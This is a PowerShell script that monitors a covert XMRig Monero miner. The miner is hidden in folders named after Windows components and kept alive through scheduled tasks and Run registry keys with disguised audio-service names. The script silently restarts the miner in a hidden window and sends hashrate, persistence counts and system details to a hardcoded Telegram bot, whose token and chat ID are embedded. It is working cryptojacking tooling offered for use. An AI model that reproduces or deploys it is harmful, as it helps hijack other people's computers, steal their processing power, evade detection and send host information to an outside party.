# XMRig Advanced Monitoring with Telegram Alerts
# Reports: Hashrate, MSR mods, huge pages, and startup status

param(
    [string]$TelegramToken = "7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE",
    [string]$ChatID = "8112985977",
    [int]$IntervalMinutes = 7,
    [switch]$Startup
)

# Set error action to silently continue
$ErrorActionPreference = "SilentlyContinue"

# Mining locations to monitor
$MiningLocations = @(
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv",
    "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.system",
    "C:\ProgramData\Microsoft\Network\Downloader",
    "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
)

# Function to send Telegram message
function Send-TelegramMessage {
    param(
        [string]$Message
    )
    
    try {
        $uri = "https://api.telegram.org/bot$TelegramToken/sendMessage"
        $body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = "HTML"
        }
        
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" | Out-Null
        return $true
    }
    catch {
        Write-Output "Failed to send Telegram message: $_"
        return $false
    }
}

# Function to check if XMRig is running
function Get-XMRigProcess {
    $process = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    return $process
}

# Function to get XMRig version
function Get-XMRigVersion {
    foreach ($location in $MiningLocations) {
        $xmrigPath = Join-Path $location "xmrig.exe"
        if (Test-Path $xmrigPath) {
            try {
                $version = & $xmrigPath --version | Select-String -Pattern "XMRig \d+\.\d+\.\d+"
                if ($version) {
                    return $version.ToString().Trim()
                }
            }
            catch {
                # Continue to next location
            }
        }
    }
    return "Unknown"
}

# Function to check MSR mod status
function Get-MSRStatus {
    foreach ($location in $MiningLocations) {
        $xmrigPath = Join-Path $location "xmrig.exe"
        if (Test-Path $xmrigPath) {
            try {
                $output = & $xmrigPath --msr-test 2>&1
                if ($output -match "MSR access is available") {
                    return "✅ MSR mods: Available"
                }
                elseif ($output -match "Cannot read MSR") {
                    return "❌ MSR mods: Unavailable"
                }
            }
            catch {
                # Continue to next location
            }
        }
    }
    return "❓ MSR mods: Status unknown"
}

# Function to check huge pages status
function Get-HugePagesStatus {
    foreach ($location in $MiningLocations) {
        $logPath = Join-Path $location "xmrig.log"
        if (Test-Path $logPath) {
            $log = Get-Content $logPath -Tail 100
            $hugePages = $log | Select-String -Pattern "huge pages"
            if ($hugePages) {
                if ($hugePages -match "enabled") {
                    return "✅ Huge pages: Enabled"
                }
                else {
                    return "❌ Huge pages: Disabled"
                }
            }
        }
    }
    
    # Try API if log not available
    try {
        $api = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 2
        if ($api.hugepages) {
            return "✅ Huge pages: Enabled"
        }
        else {
            return "❌ Huge pages: Disabled"
        }
    }
    catch {
        # API not available
    }
    
    return "❓ Huge pages: Status unknown"
}

# Function to get current hashrate
function Get-CurrentHashrate {
    try {
        # Try API first
        $api = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 2
        if ($api.hashrate.total) {
            $hashrate = [math]::Round($api.hashrate.total[0], 2)
            return "$hashrate H/s"
        }
    }
    catch {
        # API not available, try reading log
        foreach ($location in $MiningLocations) {
            $logPath = Join-Path $location "xmrig.log"
            if (Test-Path $logPath) {
                $log = Get-Content $logPath -Tail 20
                $hashrateLine = $log | Select-String -Pattern "speed" | Select-Object -Last 1
                if ($hashrateLine -match "([\d\.]+)\s+H/s") {
                    return "$($matches[1]) H/s"
                }
            }
        }
    }
    
    # If all else fails, estimate based on CPU
    try {
        $cpuInfo = Get-WmiObject Win32_Processor
        $cores = $cpuInfo.NumberOfCores
        $threads = $cpuInfo.NumberOfLogicalProcessors
        $cpuName = $cpuInfo.Name
        
        if ($cpuName -match "i5" -and $cores -ge 4) {
            return "~2800-3200 H/s (estimated)"
        }
        elseif ($cores -ge 6) {
            return "~3500-4500 H/s (estimated)"
        }
        elseif ($cores -ge 4) {
            return "~2000-3000 H/s (estimated)"
        }
        else {
            return "~1000-2000 H/s (estimated)"
        }
    }
    catch {
        return "Unknown"
    }
}

# Function to get system information
function Get-SystemInfo {
    $computerSystem = Get-WmiObject Win32_ComputerSystem
    $cpuInfo = Get-WmiObject Win32_Processor
    $osInfo = Get-WmiObject Win32_OperatingSystem
    
    $info = @{
        ComputerName = $env:COMPUTERNAME
        Model = $computerSystem.Model
        CPU = $cpuInfo.Name
        Cores = $cpuInfo.NumberOfCores
        Threads = $cpuInfo.NumberOfLogicalProcessors
        RAM = [math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)
        OS = $osInfo.Caption
    }
    
    return $info
}

# Function to get uptime information
function Get-UptimeInfo {
    $os = Get-WmiObject Win32_OperatingSystem
    $uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
    
    return "System uptime: $($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
}

# Function to check deployment status
function Get-DeploymentStatus {
    $locationCount = 0
    $runningLocation = "None"
    
    foreach ($location in $MiningLocations) {
        if (Test-Path (Join-Path $location "xmrig.exe")) {
            $locationCount++
            
            # Check if this is the running instance
            $proc = Get-XMRigProcess
            if ($proc) {
                $procPath = (Get-Process -Id $proc.Id -FileVersionInfo).FileName
                if ($procPath -match [regex]::Escape($location)) {
                    $runningLocation = $location
                }
            }
        }
    }
    
    $tasks = 0
    $scheduledTasks = @("WindowsAudioSrv1", "SystemHost1", "AudioEndpoint1", "WindowsCrossMonitor")
    foreach ($task in $scheduledTasks) {
        $taskInfo = Get-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue
        if ($taskInfo) {
            $tasks++
        }
    }
    
    $regEntries = 0
    $regPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    )
    
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $regKeys = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
            if ($regKeys.WindowsAudioSrv -or $regKeys.SystemAudioHost -or $regKeys.AudioEndpointBuilder) {
                $regEntries++
            }
        }
    }
    
    return @{
        Locations = "$locationCount/5 locations deployed"
        RunningFrom = $runningLocation
        Tasks = "$tasks scheduled tasks active"
        Registry = "$regEntries registry entries active"
    }
}

# Function to create full status report
function Get-StatusReport {
    $xmrigProcess = Get-XMRigProcess
    $sysInfo = Get-SystemInfo
    $uptime = Get-UptimeInfo
    $deployment = Get-DeploymentStatus
    
    if ($xmrigProcess) {
        $status = "✅ RUNNING"
        $hashrate = Get-CurrentHashrate
        $msrStatus = Get-MSRStatus
        $hugePagesStatus = Get-HugePagesStatus
        $version = Get-XMRigVersion
        
        # Calculate mining uptime
        $minerUptime = (Get-Date) - $xmrigProcess.StartTime
        $minerUptimeStr = "$($minerUptime.Days)d $($minerUptime.Hours)h $($minerUptime.Minutes)m"
        
        $report = @"
<b>🖥️ MINER STATUS REPORT</b>
<b>PC</b>: $($sysInfo.ComputerName)
<b>Status</b>: $status
<b>Version</b>: $version

<b>📊 PERFORMANCE</b>
<b>Hashrate</b>: $hashrate
$msrStatus
$hugePagesStatus
<b>Mining uptime</b>: $minerUptimeStr

<b>💻 SYSTEM INFO</b>
<b>CPU</b>: $($sysInfo.CPU)
<b>Cores/Threads</b>: $($sysInfo.Cores)/$($sysInfo.Threads)
<b>RAM</b>: $($sysInfo.RAM) GB
<b>OS</b>: $($sysInfo.OS)
$uptime

<b>🔒 DEPLOYMENT</b>
<b>Deployment</b>: $($deployment.Locations)
<b>Running from</b>: $($deployment.RunningFrom)
<b>Persistence</b>: $($deployment.Tasks), $($deployment.Registry)
"@
    }
    else {
        $status = "❌ NOT RUNNING"
        $report = @"
<b>🖥️ MINER STATUS REPORT</b>
<b>PC</b>: $($sysInfo.ComputerName)
<b>Status</b>: $status
<b>ALERT</b>: Miner not running!

<b>💻 SYSTEM INFO</b>
<b>CPU</b>: $($sysInfo.CPU)
<b>Cores/Threads</b>: $($sysInfo.Cores)/$($sysInfo.Threads)
<b>RAM</b>: $($sysInfo.RAM) GB
<b>OS</b>: $($sysInfo.OS)
$uptime

<b>🔒 DEPLOYMENT</b>
<b>Deployment</b>: $($deployment.Locations)
<b>Persistence</b>: $($deployment.Tasks), $($deployment.Registry)

<b>⚠️ ATTEMPTING RESTART...</b>
"@
        
        # Attempt to restart miner
        foreach ($location in $MiningLocations) {
            $xmrigPath = Join-Path $location "xmrig.exe"
            $configPath = Join-Path $location "config.json"
            if (Test-Path $xmrigPath -and Test-Path $configPath) {
                Start-Process -FilePath $xmrigPath -ArgumentList "--config=$configPath" -WindowStyle Hidden
                break
            }
        }
    }
    
    return $report
}

# Send startup notification if requested
if ($Startup) {
    $computerName = $env:COMPUTERNAME
    $message = "🚀 <b>STARTUP ALERT</b>: Miner monitor started on <b>$computerName</b> at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Send-TelegramMessage -Message $message
    
    # Wait 30 seconds for miner to start before sending full report
    Start-Sleep -Seconds 30
    $report = Get-StatusReport
    Send-TelegramMessage -Message $report
}

# Main monitoring loop
while ($true) {
    $report = Get-StatusReport
    Send-TelegramMessage -Message $report
    
    # Convert interval to seconds and sleep
    $sleepSeconds = $IntervalMinutes * 60
    Start-Sleep -Seconds $sleepSeconds
}
